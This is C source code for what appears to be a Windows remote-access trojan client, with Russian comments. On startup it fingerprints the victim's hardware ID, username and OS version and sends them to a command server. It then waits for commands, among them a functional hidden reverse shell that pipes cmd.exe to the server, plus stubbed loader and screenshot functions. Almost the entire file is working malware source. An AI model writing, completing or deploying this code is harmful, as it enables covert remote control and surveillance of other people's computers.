#include "winsock2.h"
#include "intrin.h"
#include "ntdll.h"
#include "iphlpapi.h"
#include "stdio.h"

#pragma comment(lib, "iphlpapi")
#pragma comment(lib, "ws2_32")
#pragma warning(disable : 4996)

#ifndef min
#define min(a,b) (((a) < (b)) ? (a) : (b))
#endif

#define ADDRSERVER "127.000.000.001"

SOCKET Socket;

#define CMD_HADSHAKE	0
#define CMD_ONLINE		1
#define CMD_OTVET_OK	2
#define CMD_OTVET_ER	3
#define CMD_SCREEN		4
#define CMD_LOADER		5
#define CMD_SHELL		6

int x1, y1, x2, y2, w, h;

typedef struct CLIENTS
{
	SOCKET SOCKET;
	char USERNAME[100];
	char OSVER[100];
	char HWID[100];
} CLIENTS;

typedef struct DLE
{
	char URL[1000];
} DLE;

typedef struct BIGSCREEN
{
	int w;
	int h;
	ULONG ZipSize;
} BIGSCREEN;

typedef struct CMDiDATA
{
	DWORD CMD;
	char DATA[1000];
} CMDiDATA;

char* GetHwid()
{
	int CPUInfo[4];
	PIP_ADAPTER_INFO pAdapterInfo;
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen;
	wchar_t mac[8] = { 0x1, 0x2, 0x1, 0x2, 0x1, 0x2, 0x1, 0x2 };
	__cpuid(CPUInfo, 0);
	dwBufLen = sizeof(AdapterInfo);
	GetAdaptersInfo(AdapterInfo, &dwBufLen);
	pAdapterInfo = AdapterInfo;
	do
	{
		int i;
		for (i = 0; i < 8; i++)
		{
			mac[i] = mac[i] + pAdapterInfo->Address[i];
		}
		pAdapterInfo = pAdapterInfo->Next;
	} while (pAdapterInfo);
	char hwid[100];
	memset(hwid, 0, sizeof(hwid));
	wsprintfA(hwid, "%x%x%x%x%x%x%x%x%x%x%x%x",
		CPUInfo[0], CPUInfo[1], CPUInfo[2],
		CPUInfo[3], mac[0], mac[1],
		mac[2], mac[3], mac[4],
		mac[5], mac[6], mac[7]);
	return hwid;
}

char* GetUsername()
{
	char username[100];
	DWORD size = UNLEN;
	memset(username, 0, sizeof(username));
	GetUserNameA(username, &size);
	return username;
}

char* GetOS()
{
	char os[100];
	PPEBME pPeb = (PPEBME)__readfsdword(0x30);
	memset(os, 0, sizeof(os));
	wsprintfA(os, "%d.%d.%d", pPeb->NtMajorVersion, pPeb->NtMinorVersion, pPeb->NtBuildNumber);
	return os;
}

DWORD WINAPI GETSCREEN(LPVOID param)
{
	return 0;
}

DWORD WINAPI DLEFUNC(LPVOID url)
{
	char *urlarrdfile = (char*)url;
	CMDiDATA indata; //создаем структуру отвечающую за протокол
	memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
	indata.CMD = CMD_OTVET_OK;
	send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
	return 0;
}

DWORD WINAPI RUNSHELL(LPVOID port)
{
	SOCKADDR_IN sin;
	SOCKET shellsock;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(8080);
	sin.sin_addr.S_un.S_addr = inet_addr(ADDRSERVER);
	shellsock = socket(AF_INET, SOCK_STREAM, 0);

	DWORD lpNumberOfBytesRead;
	SECURITY_ATTRIBUTES secu =
	{
		(DWORD)sizeof(SECURITY_ATTRIBUTES), NULL, TRUE
	};

	STARTUPINFOA sInfo;
	PROCESS_INFORMATION pInfo;
	HANDLE hPipeRead1, hPipeWrite1, hPipeRead2, hPipeWrite2;
	char szBuffer[4096], szCmdPath[MAX_PATH];
	int i, count = 0;
	CreatePipe(&hPipeRead1, &hPipeWrite1, &secu, 0);
	CreatePipe(&hPipeRead2, &hPipeWrite2, &secu, 0);
	GetEnvironmentVariableA("ComSpec", szCmdPath, sizeof(szCmdPath));

	memset(&sInfo, 0, sizeof(sInfo));
	memset(&pInfo, 0, sizeof(pInfo));
	sInfo.cb = sizeof(STARTUPINFOA);
	sInfo.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
	sInfo.wShowWindow = SW_HIDE;
	sInfo.hStdInput = hPipeRead2;
	sInfo.hStdOutput = hPipeWrite1;
	sInfo.hStdError = hPipeWrite1;
	CreateProcessA(NULL, szCmdPath, &secu, &secu, TRUE, 0, NULL, NULL, &sInfo, &pInfo);

	while (TRUE)
	{
		if (connect(shellsock, (SOCKADDR*)&sin, sizeof(sin)) == 0)
		{
			while (TRUE)
			{
				Sleep(100);
				memset(szBuffer, 0, sizeof(szBuffer));
				PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
				while (lpNumberOfBytesRead)
				{
					Sleep(200);
					if (!ReadFile(hPipeRead1, szBuffer, sizeof(szBuffer), &lpNumberOfBytesRead, NULL)) 
						break;
					else
					{
						send(shellsock, szBuffer, lpNumberOfBytesRead, 0);
					}
						
					PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
				}
				
				Sleep(200);

				i = recv(shellsock, szBuffer, sizeof(szBuffer), 0);

				if (shellsock == 0)
				{
					count++;
					if (count > 1) break;
				}

				if (!strstr(szBuffer, "exit") == 0)
				{
					closesocket(shellsock);
					goto exit;
				}

				else 
					WriteFile(hPipeWrite2, szBuffer, i, &lpNumberOfBytesRead, 0);
			}
		}
		else
		{
			Sleep(100);
		}
	}
exit:
	TerminateProcess(pInfo.hProcess, 0);
	return 0;
}

DWORD WINAPI RecvThread(LPVOID param)
{
	while (TRUE)
	{
		CMDiDATA indata; //создаем структуру отвечающую за протокол
		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 							  //recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0); //прием сообщения от cервера
		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от cервера
		{
			switch (indata.CMD)
			{
				case CMD_LOADER://если indata.cmd == CMD_LOADER
				{
					DLE dle; //инициализируем структуру DLE
					memset(&dle, 0, sizeof(DLE)); //очищаем ее
					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
					CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);
					break;
				}

				case CMD_SHELL:
				{
					CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RUNSHELL, NULL, 0, 0);
				}

				case CMD_SCREEN:
				{
					CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GETSCREEN, NULL, 0, 0);
				}
				default:
					break;
			}
		}
		else {
			if (10054 == GetLastError())
			{
				closesocket(Socket);
				return 0;
			}
			Sleep(1000);
		}
	}
	return 0;
}

int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{
	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	pRtlGetCompressionWorkSpaceSize = (fRtlGetCompressionWorkSpaceSize)\
		GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
	pRtlCompressBuffer = (fRtlCompressBuffer)\
		GetProcAddress(ntdll, "RtlCompressBuffer");

	struct WSAData wsaData;
	SOCKADDR_IN ServerAddr;
	WORD DLLVersion = MAKEWORD(2, 2);
	WSAStartup(DLLVersion, &wsaData);

start:
	memset(&ServerAddr, 0, sizeof(ServerAddr));
	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	ServerAddr.sin_family = AF_INET;
	//задаем конект на локалхост к восьмидесятому порту
	ServerAddr.sin_port = htons(80);
	ServerAddr.sin_addr.s_addr = inet_addr(ADDRSERVER);
	//подключаемся к серверу!!!

	if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
	{
		//если мы подключились то передаем хендшейк:)
		CMDiDATA indata; //создаем структуру отвечающую за протокол
		CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
		memset(&client, 0, sizeof(CLIENTS)); //почистим
		memcpy(client.HWID, GetHwid(), sizeof(client.HWID));
		memcpy(client.USERNAME, GetUsername(), sizeof(client.USERNAME));
		memcpy(client.OSVER, GetOS(), sizeof(client.OSVER));
		indata.CMD = CMD_HADSHAKE;
		memcpy(indata.DATA, &client, sizeof(CLIENTS));
		send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
		HANDLE RECV = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //создаем тред который будет бесконечно принимать сообщения от сервера
		WaitForSingleObject(RECV, INFINITE); //Бесконечно ожидаем пока этот тред работает...
	}
	Sleep(10000);
	goto start;
}
